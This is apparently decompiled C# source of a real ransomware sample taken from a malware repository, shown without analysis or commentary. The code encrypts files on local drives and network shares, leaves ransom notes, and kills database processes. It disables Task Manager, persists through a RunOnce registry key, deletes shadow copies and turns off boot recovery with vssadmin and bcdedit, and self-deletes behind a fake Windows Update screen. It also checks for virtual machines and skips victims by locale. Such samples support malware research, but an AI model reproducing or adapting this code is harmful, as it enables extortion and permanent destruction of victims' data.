// Decompiled with JetBrains decompiler
// Type: osilokinom.Form1
// Assembly: xaqipaxowq, Version=2.7.3.1, Culture=neutral, PublicKeyToken=null
// MVID: 717542D9-9F58-42E9-9315-5411271D63FD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Trojan-Ransom.Win32.Generic-1d16285d88d42a50c89fddfc9f1449b38b3f8e0e680f4b1b57bf88a4143a2812.exe

using Microsoft.Win32;
using osilokinom.Properties;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Trinet.Networking;

namespace osilokinom
{
  public class Form1 : Form
  {
    private const int keySize = 2048;
    private DriveInfo[] Drives = DriveInfo.GetDrives();
    private string finalransomwalue = Form1.RandomRansom(7);
    private string computerName = Environment.MachineName.ToString();
    private string userName = Environment.UserName;
    private string userNameG = Guid.NewGuid().ToString();
    private string result_filename;
    private string version = "blpo";
    private DateTime nowTime = DateTime.Now;
    private string finalcountry;
    private static bool OAEP = false;
    private string publicKey;
    private string encryptedPassword;
    private static Encoding enc8 = Encoding.UTF8;
    private string pathbackup = Path.GetTempPath() + "backup//";
    private string[] base_ex = new string[72]
    {
      ".mdf",
      ".db",
      ".mdb",
      ".sql",
      ".pdb",
      ".pdb",
      ".pdb",
      ".dsk",
      ".fp3",
      ".fdb",
      ".accdb",
      ".dbf",
      ".crd",
      ".db3",
      ".dbk",
      ".nsf",
      ".gdb",
      ".abs",
      ".sdb",
      ".sdb",
      ".sdb",
      ".sqlitedb",
      ".edb",
      ".sdf",
      ".sqlite",
      ".dbs",
      ".cdb",
      ".cdb",
      ".cdb",
      ".bib",
      ".dbc",
      ".usr",
      ".dbt",
      ".rsd",
      ".myd",
      ".pdm",
      ".ndf",
      ".ask",
      ".udb",
      ".ns2",
      ".kdb",
      ".ddl",
      ".sqlite3",
      ".odb",
      ".ib",
      ".db2",
      ".rdb",
      ".wdb",
      ".tcx",
      ".emd",
      ".sbf",
      ".accdr",
      ".dta",
      ".rpd",
      ".btr",
      ".vdb",
      ".daf",
      ".dbv",
      ".fcd",
      ".accde",
      ".mrg",
      ".nv2",
      ".pan",
      ".dnc",
      ".dxl",
      ".tdt",
      ".accdc",
      ".eco",
      ".fmp",
      ".vpd",
      ".his",
      ".fid"
    };
    private bool _closeoff = true;
    private int numfile;
    private string[] words = new string[1]{ ".lnk" };
    private string password = Form1.CreatePassword(32);
    private string encryptedPasswordw;
    private string zencryptedPassword;
    private string zencryptedPasswordw;
    private IContainer components;
    private Label label1;

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo(
      uint action,
      uint uParam,
      string vParam,
      uint winIni);

    public Form1()
    {
      Thread.Sleep(new Random().Next(5000, 10000));
      this.InitializeComponent();
    }

    private void textBox1_TextChanged(object sender, EventArgs e)
    {
    }

    private void fornewthread()
    {
      Thread.Sleep(new Random().Next(5000, 20000));
      this.go();
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e) => e.Cancel = this._closeoff;

    private void Form1_Load(object sender, EventArgs e)
    {
      string processName = Process.GetCurrentProcess().ProcessName;
      int num = 0;
      foreach (Process process in Process.GetProcesses())
      {
        if (process.ProcessName.Contains(processName))
        {
          ++num;
          if (num > 1)
          {
            try
            {
              Environment.Exit(0);
              this.Close();
              Application.Exit();
            }
            catch
            {
            }
          }
        }
      }
      this.BackColor = ColorTranslator.FromHtml("#07466c");
      this.updating();
      new Thread(new ThreadStart(this.fornewthread)).Start();
    }

    public void go()
    {
      string[] source = new string[9]
      {
        "ru",
        "be",
        "uk",
        "kk",
        "ky",
        "hy",
        "ka",
        "tt",
        "uz"
      };
      string getsysteminfo = this.getsysteminfo;
      string str = Form1.TruncateLongString(getsysteminfo, 2);
      if (((IEnumerable<string>) source).Contains<string>(str))
      {
        this.SelfDelete();
        Environment.Exit(0);
        this.Close();
        Application.Exit();
      }
      string winName = Form1.GetWinName();
      string processName = Process.GetCurrentProcess().ProcessName;
      string s = getsysteminfo + "_" + this.finalransomwalue + "_" + this.userName + "_" + (object) this.nowTime + "_" + winName + "_" + this.version + "_" + processName;
      this.KillCtrlAltDelete();
      this.Autorun();
      this.publicKey = "<RSAKeyValue><Modulus>muXoovPOcd+t3P9XfR59OlDrjJEHWonHvJ2hDDj4YwiuEgwCEvOeX5+j+/PZrvpP1xWCOzPW3RJd/PYjjNcOFRTbTebQvHkOcn8Bl58aXuP2TwDMvcRP5MgykjwqqIVMMY7IWNlGzUGzyko8BAmYlve9mPlQgcFEjJixnXqfRI2lgNd2sOj93gNag7XOo2ndBC7U8ZCrgg5q3t+bqb9LSQEKkZLK0kpiAFTIJkAMOuIbFvEYKkhWaQQhUC1e/3zzKKP8JN4mw/kGSXitNmLRwCVau5/VB5u3l6n8DfUkCuGJAfPWhL/D96e9jtgs2WbIQndZMNKVmLKKIwNbUvwXWQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
      this.encryptedPassword = Form1.EncryptTextRSA(this.password, 2048, this.publicKey);
      this.finalcountry = Convert.ToBase64String(Encoding.UTF8.GetBytes(s));
      this.encryptedPassword = this.encryptedPassword + "&" + this.finalcountry;
      this.Keyback(this.finalransomwalue, this.password, this.finalcountry);
      foreach (DriveInfo drive in this.Drives)
      {
        try
        {
          this.lockdir(drive.RootDirectory.ToString(), this.password, this.words);
        }
        catch (IOException ex)
        {
        }
      }
      this.Network(this.password, this.words);
      this.Slite();
      this.KillAutorun();
      this.password = (string) null;
      this.DelBack();
      this._closeoff = false;
      this.Close();
      this.SelfDelete();
      Application.Exit();
    }

    public static string TruncateLongString(string inputString, int maxChars)
    {
      if (maxChars <= 0)
        throw new ArgumentOutOfRangeException(nameof (maxChars));
      return inputString == null || inputString.Length < maxChars ? inputString : inputString.Substring(0, maxChars);
    }

    public static int GetInt(RNGCryptoServiceProvider rnd, int max)
    {
      byte[] data = new byte[4];
      int num;
      do
      {
        rnd.GetBytes(data);
        num = BitConverter.ToInt32(data, 0) & int.MaxValue;
      }
      while (num >= max * (int.MaxValue / max));
      return num % max;
    }

    public static string CreatePassword(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      using (RNGCryptoServiceProvider rnd = new RNGCryptoServiceProvider())
      {
        while (length-- > 0)
          stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!="[Form1.GetInt(rnd, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*/&%!=".Length)]);
      }
      return stringBuilder.ToString();
    }

    public static string RandomRansom(int length)
    {
      StringBuilder stringBuilder = new StringBuilder();
      using (RNGCryptoServiceProvider rnd = new RNGCryptoServiceProvider())
      {
        while (length-- > 0)
          stringBuilder.Append("1234567890"[Form1.GetInt(rnd, "1234567890".Length)]);
      }
      return stringBuilder.ToString();
    }

    private string getsysteminfo => CultureInfo.CurrentCulture.Name;

    private void Network(string password, string[] words)
    {
      try
      {
        foreach (string networkComputer in new NetworkBrowser().getNetworkComputers())
        {
          if (networkComputer != null && networkComputer.Trim().Length > 0)
          {
            ShareCollection shares = ShareCollection.GetShares(networkComputer);
            if (shares != null)
            {
              foreach (Share share in (ReadOnlyCollectionBase) shares)
              {
                if (share.ShareType == ShareType.Disk)
                {
                  string str = share.ToString();
                  if (str.Contains<char>('\\'))
                  {
                    if (password == "reset")
                      this.lockdir(str, "reset", words);
                    else
                      this.lockdir(str, password, words);
                  }
                }
              }
            }
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    private void DisplayMessageBoxText(string info)
    {
      int num = (int) MessageBox.Show(info);
    }

    public byte[] AES_Encrypt1(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.Padding = PaddingMode.None;
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          return memoryStream.ToArray();
        }
      }
    }

    public byte[] AES_Encrypt2(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      using (MemoryStream memoryStream = new MemoryStream())
      {
        using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
        {
          rijndaelManaged.KeySize = 256;
          rijndaelManaged.BlockSize = 128;
          Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
          rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
          rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
          rijndaelManaged.Mode = CipherMode.CBC;
          using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
          {
            cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
            cryptoStream.Close();
          }
          return memoryStream.ToArray();
        }
      }
    }

    public void lockdir(string location, string password, string[] words)
    {
      string[] files = Directory.GetFiles(location);
      string[] directories = Directory.GetDirectories(location);
      if (location.Contains("WINDOWS") || location.Contains("RECYCLER") || location.Contains("Program Files") || location.Contains("Program Files (x86)") || location.Contains("Windows") || location.Contains("Recycle.Bin") || location.Contains("RECYCLE.BIN") || location.Contains("Recycler") || location.Contains("TEMP") || location.Contains("APPDATA") || location.Contains("AppData") || location.Contains("Temp") || location.Contains("ProgramData") || location.Contains("Microsoft") || location.Contains("Burn"))
        return;
      for (int index = 0; index < files.Length; ++index)
      {
        try
        {
          string extension = Path.GetExtension(files[index]);
          string str1 = (string) null;
          using (FileStream fileStream = File.Open(files[index], FileMode.Open, FileAccess.Read))
          {
            byte[] numArray = new byte[10];
            fileStream.Position = fileStream.Length - (long) numArray.Length;
            fileStream.Read(numArray, 0, numArray.Length);
            str1 = Form1.enc8.GetString(numArray);
          }
          if (!((IEnumerable<string>) words).Contains<string>(extension))
          {
            if (files[index].Contains("README_"))
            {
              if (password == "reset")
              {
                try
                {
                  string str2 = File.ReadAllText(files[index]);
                  string[] separator = new string[10]
                  {
                    ",",
                    ".",
                    "!",
                    "?",
                    ";",
                    ":",
                    " ",
                    "\r\n",
                    "\r",
                    "\n"
                  };
                  foreach (string str3 in str2.Split(separator, StringSplitOptions.RemoveEmptyEntries))
                  {
                    if (str3.Length > 341)
                      this.zencryptedPassword = str3;
                  }
                  if (!this.zencryptedPassword.Contains("##"))
                  {
                    int num = files[index].IndexOf("README_");
                    string str4 = files[index].Substring(num + 7).Replace(".txt", "");
                    this.zencryptedPasswordw = File.ReadAllText(Path.GetTempPath() + str4 + "_dat.log");
                    if (!string.IsNullOrEmpty(this.zencryptedPasswordw))
                    {
                      File.WriteAllText(files[index], string.Empty);
                      string contents = Encoding.UTF8.GetString(Convert.FromBase64String("SGVsbG*hIEFsbCB%b#VyIGZpbGVzIGhhdmUgYmVlbiBlbmNyeXB-ZWQuLi_NCg-KWW(!ciBwZXJzb@%hbCBJZDoNCiR^ZW%jcnlwdGVkUGFzc#dvcmR#IyMkbnVtZmlsZQ-KDQpUbyBkZWNyeXB-IHlvdXIgZmlsZXMgeW(!IG%lZWQgdG*gaW%zdGFsbCB-b#IgYnJvd#NlciwgeW(!IGNhbiBkb#dubG(hZCBpdCBoZXJlOiBodHRwczovL#d#dy%-b#Jwcm(qZWN-Lm(yZy(kb#dubG(hZC(kb#dubG(hZC%odG!sLmVuIA-KQWZ-ZXIgaW%zdGFsbGF-aW(uLCBvcGVuIHRoZSB-b#IgYnJvd#NlciB-byB#ZWJzaXRlOiBodHRwOi*vdjd%ZHZlNG!rYW*@YzZ-bS%vbmlvbiBvciBodHRwOi*vbmhhcWRpa@hqNGFlaWdrZS%vbmlvbiBhbmQgZm(sbG(#IHRoZSBpbnN-cnVjdGlvbnMuDQoNCkRvIG%vdCB-cnkgcmVzdG(yZSBmaWxlcyB#aXRob#V-IG(!ciBoZWxwLCB-aGlzIGlzIHVzZWxlc#MsIGFuZCBjYW_gZGVzdHJveSB%b#UgZGF-YSBwZXJtYW%ldGx%Lg-KSG(#ZXZlciwgdGhlIGZpbGVzIGNhbiBiZSByZWNvdmVyZWQgZXZlbiBhZnRlciB-aGUgcmVtb#ZhbCBvZiBvdXIgcHJvZ#JhbSBhbmQgZXZlbiBhZnRlcg-KcmVpbnN-YWxsaW%nIHRoZSBvcGVyYXRpbmcgc#lzdGVtLg))".Replace("!", "1").Replace("@", "2").Replace("#", "3").Replace("_", "4").Replace("%", "5").Replace("^", "6").Replace("&", "7").Replace("*", "8").Replace("(", "9").Replace(")", "=").Replace("-", "0"))).Replace("$zencryptedPasswordw", this.zencryptedPasswordw).Replace("$numfile", Convert.ToBase64String(Encoding.UTF8.GetBytes(this.numfile.ToString())));
                      File.WriteAllText(files[index], contents, Encoding.UTF8);
                    }
                  }
                }
                catch (Exception ex)
                {
                }
              }
            }
            else if (str1.Contains("###"))
            {
              string str5 = str1.Replace("###", "");
              try
              {
                Convert.ToInt32(str5);
              }
              catch (Exception ex)
              {
                if (!(password == "reset"))
                  this.LockFile(files[index], password);
              }
            }
            else if (!(password == "reset"))
              this.LockFile(files[index], password);
          }
        }
        catch (UnauthorizedAccessException ex)
        {
        }
        catch (Exception ex)
        {
        }
      }
      for (int index = 0; index < directories.Length; ++index)
      {
        try
        {
          if (password == "reset")
          {
            this.lockdir(directories[index], "reset", words);
          }
          else
          {
            this.lockdir(directories[index], password, words);
            this.WriteInfo(directories[index], password);
          }
        }
        catch (UnauthorizedAccessException ex)
        {
        }
        catch (Exception ex)
        {
        }
      }
    }

    public void LockFile(string file, string password)
    {
      this.checkTask();
      ++this.numfile;
      long num = 1048576;
      FileInfo fileInfo = new FileInfo(file);
      long length = fileInfo.Length;
      string extension = Path.GetExtension(file);
      if (length < num || ((IEnumerable<string>) this.base_ex).Contains<string>(extension))
      {
        byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
        byte[] bytes1 = Encoding.UTF8.GetBytes(password);
        byte[] hash = SHA256.Create().ComputeHash(bytes1);
        byte[] bytes2 = this.AES_Encrypt2(bytesToBeEncrypted, hash);
        File.WriteAllBytes(file, bytes2);
        this.result_filename = Path.GetFileName(file);
        string base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(this.result_filename));
        string directoryName = fileInfo.DirectoryName;
        byte[] bytes3 = Encoding.Default.GetBytes("###" + this.finalransomwalue);
        using (FileStream fileStream = new FileStream(file, FileMode.Append, FileAccess.Write))
        {
          fileStream.Write(bytes3, 0, bytes3.Length);
          fileStream.Flush();
          fileStream.Close();
        }
        File.Move(file, directoryName + "/" + base64String);
      }
      else
        this.AES_Encrypt(file, password);
    }

    public void AES_Encrypt(string file, string password)
    {
      byte[] buffer1 = new byte[1048576];
      try
      {
        using (FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read))
        {
          fileStream.Read(buffer1, 0, buffer1.Length);
          fileStream.Close();
        }
      }
      catch (UnauthorizedAccessException ex)
      {
      }
      try
      {
        using (FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Write))
        {
          byte[] bytesToBeEncrypted = buffer1;
          byte[] bytes = Encoding.UTF8.GetBytes(password);
          byte[] hash = SHA256.Create().ComputeHash(bytes);
          byte[] buffer2 = this.AES_Encrypt1(bytesToBeEncrypted, hash);
          fileStream.Write(buffer2, 0, buffer2.Length);
          fileStream.Close();
        }
      }
      catch (UnauthorizedAccessException ex)
      {
      }
      FileInfo fileInfo = new FileInfo(file);
      this.result_filename = Path.GetFileName(file);
      string base64String = Convert.ToBase64String(Encoding.UTF8.GetBytes(this.result_filename));
      string directoryName = fileInfo.DirectoryName;
      byte[] bytes1 = Encoding.Default.GetBytes("###" + this.finalransomwalue);
      using (FileStream fileStream = new FileStream(file, FileMode.Append, FileAccess.Write))
      {
        fileStream.Write(bytes1, 0, bytes1.Length);
        fileStream.Flush();
        fileStream.Close();
      }
      File.Move(file, directoryName + "/" + base64String);
    }

    public void WriteInfo(string path, string password)
    {
      string contents = Encoding.UTF8.GetString(Encoding.Default.GetBytes(Resources.tt)).Replace("$encryptedPassword", this.encryptedPassword);
      File.WriteAllText(path + "\\README_" + this.finalransomwalue + ".txt", contents, Encoding.UTF8);
    }

    public void Slite()
    {
      string[] source = new string[47]
      {
        "ar-SA",
        "ar-AE",
        "nl-BE",
        "nl-NL",
        "en-GB",
        "en-US",
        "en-CA",
        "en-AU",
        "en-NZ",
        "fr-BE",
        "fr-CH",
        "fr-FR",
        "fr-CA",
        "fr-LU",
        "de-AT",
        "de-DE",
        "de-CH",
        "it-CH",
        "it-IT",
        "ko-KR",
        "pt-PT",
        "es-ES",
        "sv-FI",
        "sv-SE",
        "bg-BG",
        "ca-ES",
        "cs-CZ",
        "da-DK",
        "el-GR",
        "en-IE",
        "et-EE",
        "eu-ES",
        "fi-FI",
        "hu-HU",
        "ja-JP",
        "lt-LT",
        "nn-NO",
        "pl-PL",
        "ro-RO",
        "se-FI",
        "se-NO",
        "se-SE",
        "sk-SK",
        "sl-SI",
        "sv-FI",
        "sv-SE",
        "tr-TR"
      };
      string getsysteminfo = this.getsysteminfo;
      RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SYSTEM\\CurrentControlSet\\services\\Disk\\Enum");
      string str = (string) registryKey.GetValue("0");
      registryKey.Close();
      if (str.Contains("VBOX") || str.Contains("Virtual") || str.Contains("VMware") || Form1.Pro() == "good" || !((IEnumerable<string>) source).Contains<string>(getsysteminfo) || !Form1.GetWinName().Contains("Serv") && this.numfile <= 5000)
        return;
      foreach (DriveInfo drive in this.Drives)
      {
        try
        {
          this.lockdir(drive.RootDirectory.ToString(), "reset", this.words);
        }
        catch (IOException ex)
        {
        }
      }
      this.Network("reset", this.words);
    }

    private static string Pro()
    {
      foreach (Process process in Process.GetProcesses())
      {
        if (!process.ProcessName.Contains("VBox"))
        {
          if (!process.ProcessName.Contains("prl_"))
          {
            if (!process.ProcessName.Contains("srvc.exe"))
            {
              if (!process.ProcessName.Contains("vmtoolsd"))
                continue;
            }
          }
        }
        try
        {
          return "good";
        }
        catch (Exception ex)
        {
        }
      }
      return "Null";
    }

    private static string GetWinName()
    {
      string name = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
      using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name))
      {
        if (registryKey == null)
          return "Null";
        try
        {
          string str = registryKey.GetValue("ProductName").ToString();
          if (str == "")
            return "null";
          if (str.Contains("XP"))
            return "XP";
          if (str.Contains("7"))
            return "Win 7";
          if (str.Contains("2003"))
            return "Serv 2003";
          if (str.Contains("8"))
            return str.Contains("2008") ? "Serv 2008" : "Win 8";
          if (str.Contains("10"))
            return "Win 10";
          if (str.Contains("11"))
            return "Win 11";
          if (str.Contains("2012"))
            return "Serv 2012";
          if (str.Contains("2016"))
            return "Serv 2016";
          if (str.Contains("2019"))
            return "Serv 2019";
          if (str.Contains("2022"))
            return "Serv 2022";
          return str.Contains("Server") ? "Serv" : "Unknow";
        }
        catch (Exception ex)
        {
          return ex.Message;
        }
      }
    }

    public void Keyback(string finalransomwalue, string password, string finalcountry)
    {
      string str1 = "<RSAKeyValue><Modulus>vhmMf1lRw5KH1+HMYj39f15c0VNUo1NPJllMQRIH06yeUAH6m4ca1LdMAQLgZ75mqP3vRXWYgKdNsJgNQgmehOnBUK7XP4z2PdzbiOvYsBp0RYfs9Zjl72Z4FDRqg6kpN7PJpj4+o0MWuy9zvEQNUqUvpLjn+MaiDfLVCKN9yA3/q1AmSL0lNzRolYsykKDZS3H5xelknP6oqSxjHb5bzs7Vh8xcYDSRETCwjxBduSgdfq1JQ3mcEJORAQA5FabhhtBnk/OYRmyWD7TMs9kYAaMOB+z/SkSHsj+7f9oyx1I9JX64gV9EUAcN0JKTKj5OVvubTVnAHZ4lCkWx8OOSbw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
      string str2 = "<RSAKeyValue><Modulus>1lJJP6yjJ3DTj5kEjKbpaf2FUwwf64fL79zTeGjudy4lRO3FBYGG9upuE3kmIeSp8hImEfnS5zasBl1jZUdGU+2PzxpXxwVu2VZuIg4NLt6mi+YloKD2ktKoJig79dV45/Q/NJFXqn85HnyIfq9SMU73xOSAxLbjDf6AJP2qy9qbSABM5Ru2cDMFAk5zWxMzkL2cDJWcRDjGPJMGc/2vmSq1EqU1Hkh7H14BALVNZiU/RlrylonkG8F7bDrsf4khYIvy3Fjhd1RzXPWatYZ8QIG4hVR7+a1xB2xSw4PYdkWZzapG5TV9tdVsbOPqX2YnVNUC78up7BNJ2f6oGD98QQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
      string str3 = "<RSAKeyValue><Modulus>mIQGhVh6BsMy9VtgYx0PeSn4HsWtP7LoxukEidvPenuEMC2fGc6AZb+tZ62E6Z8YzZo8OKsT4EwGx0RJUoB9byzn/DvVktGIhWoeYIz0nzVBOMyrXKn5QiaPW4ZP+a4xQoA0GzVnRwe7+HjiYiWY357EX7PHujaU6mvLe/bVRIoY7QHKzUvmQZohY6qj/bMdJXF6YbDw9/gXXqEnCz4LQNG6/Z4SjNv6vc7YU1V4aT1Jdl2sIufpAocVZeNdqV0c/Qrh/TIVhod9okGod7DwFFYZ6NmknNYTpsZVBSISyZllNkjmwDA0OMI0p+LNFvBubWqe6Vj71kdER8h+T+x4Xw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
      Random random = new Random();
      string[] strArray = new string[3]{ str1, str2, str3 };
      int index = random.Next(0, 2);
      string contents = Form1.EncryptTextRSA(password, 2048, strArray[index]) + "&" + finalcountry + "&" + (object) index;
      File.WriteAllText(Path.GetTempPath() + finalransomwalue + "_dat.log", contents);
    }

    public void KillCtrlAltDelete()
    {
      string str = "1";
      string subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
      try
      {
        RegistryKey subKey = Registry.CurrentUser.CreateSubKey(subkey);
        subKey.SetValue("DisableTaskMgr", (object) str);
        subKey.Close();
      }
      catch (Exception ex)
      {
      }
    }

    public static string EncryptTextRSA(string text, int keySize, string publicKeyXml) => Convert.ToBase64String(Form1.RSAEncrypt(Encoding.UTF8.GetBytes(text), keySize, publicKeyXml));

    public static byte[] RSAEncrypt(byte[] data, int keySize, string publicKeyXml)
    {
      using (RSACryptoServiceProvider cryptoServiceProvider = new RSACryptoServiceProvider(keySize))
      {
        cryptoServiceProvider.FromXmlString(publicKeyXml);
        return cryptoServiceProvider.Encrypt(data, Form1.OAEP);
      }
    }

    public void Autorun()
    {
      string str1 = Path.GetTempPath() + "Adobe//";
      try
      {
        if (!Directory.Exists(this.pathbackup))
          Directory.CreateDirectory(str1).Attributes = FileAttributes.Hidden | FileAttributes.Directory;
      }
      catch
      {
      }
      string location = Assembly.GetExecutingAssembly().Location;
      string fileName = Path.GetFileName(location);
      try
      {
        File.Copy(location, Path.Combine(str1, fileName), false);
      }
      catch
      {
      }
      RegistryKey subKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\");
      string str2 = Path.GetTempPath() + "Adobe";
      subKey.SetValue(fileName, (object) (str2 + "\\" + fileName));
      subKey.Close();
    }

    public void KillAutorun()
    {
      string name = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce";
      string fileName = Path.GetFileName(Assembly.GetExecutingAssembly().Location);
      try
      {
        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true))
        {
          if (registryKey != null)
          {
            registryKey.DeleteValue(fileName);
            Registry.CurrentUser.DeleteSubKey(fileName);
          }
        }
      }
      catch (Exception ex)
      {
      }
      try
      {
        Directory.Delete(Path.GetTempPath() + "Adobe\\", true);
      }
      catch (Exception ex)
      {
      }
    }

    public void updating()
    {
      int timeinstall = 1;
      this.label1.Text = "Configuring critical Windows Updates" + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + timeinstall.ToString() + "% complete" + Environment.NewLine + "Do not turn off your computer.";
      System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer()
      {
        Interval = 100000
      };
      timer.Tick += (EventHandler) ((o, args) =>
      {
        ++timeinstall;
        if (timeinstall >= 100)
          return;
        this.label1.Text = "Configuring critical Windows Updates" + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + Environment.NewLine + timeinstall.ToString() + "% complete" + Environment.NewLine + "Do not turn off your computer.";
      });
      timer.Start();
    }

    private void checkTask()
    {
      List<string> stringList = new List<string>()
      {
        "taskmgr",
        "sqlagent",
        "winword",
        "sqlbrowser",
        "sqlservr",
        "sqlwriter",
        "oracle",
        "ocssd",
        "dbsnmp",
        "synctime",
        "mydesktopqos",
        "agntsvc.exeisqlplussvc",
        "xfssvccon",
        "mydesktopservice",
        "ocautoupds",
        "agntsvc.exeagntsvc",
        "agntsvc.exeencsvc",
        "firefoxconfig",
        "tbirdconfig",
        "ocomm",
        "mysqld",
        "sql",
        "mysqld-nt",
        "mysqld-opt",
        "dbeng50",
        "sqbcoreservice"
      };
      Process[] processes = Process.GetProcesses();
      try
      {
        foreach (Process process in processes)
        {
          foreach (string str in stringList)
          {
            if (process.ProcessName.ToLower().Contains(str.ToLower()))
              process.Kill();
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    public void SelfDelete()
    {
      string executablePath = Application.ExecutablePath;
      StreamWriter streamWriter = new StreamWriter("update.bat");
      streamWriter.WriteLine("@echo off");
      streamWriter.WriteLine("ping -n 1 -w 5000 10.10.254.254 >nul");
      streamWriter.WriteLine("del \"" + executablePath + "\"");
      streamWriter.WriteLine("del %0");
      streamWriter.Close();
      Process.Start("update.bat");
      Application.Exit();
    }

    public void DelBack()
    {
      bool flag = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
      string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "delback.bat");
      string contents = "vssadmin delete shadows /all /quiet & bcdedit.exe /set {default} recoveryenabled no & bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures";
      File.WriteAllText(path, contents, Encoding.Default);
      ProcessStartInfo startInfo = new ProcessStartInfo();
      startInfo.Verb = "runas";
      startInfo.FileName = path;
      if (!flag)
      {
        try
        {
          Process.Start(startInfo);
        }
        catch (Win32Exception ex)
        {
        }
      }
      else
      {
        try
        {
          Process.Start(startInfo);
        }
        catch (Win32Exception ex)
        {
        }
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.label1 = new Label();
      this.SuspendLayout();
      this.label1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.label1.BackColor = System.Drawing.Color.Transparent;
      this.label1.Font = new Font("Segoe UI Light", 20.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
      this.label1.ForeColor = SystemColors.ButtonFace;
      this.label1.Image = (Image) Resources.win8_spinner;
      this.label1.Location = new Point(417, 278);
      this.label1.Name = "label1";
      this.label1.Size = new Size(362, 106);
      this.label1.TabIndex = 0;
      this.label1.Text = "\"Multi-line \\r\\nlabel\"";
      this.label1.TextAlign = ContentAlignment.MiddleCenter;
      this.label1.UseWaitCursor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.AutoSize = true;
      this.ClientSize = new Size(1264, 681);
      this.Controls.Add((Control) this.label1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = nameof (Form1);
      this.TopMost = true;
      this.UseWaitCursor = true;
      this.WindowState = FormWindowState.Maximized;
      this.Load += new EventHandler(this.Form1_Load);
      this.ResumeLayout(false);
    }
  }
}
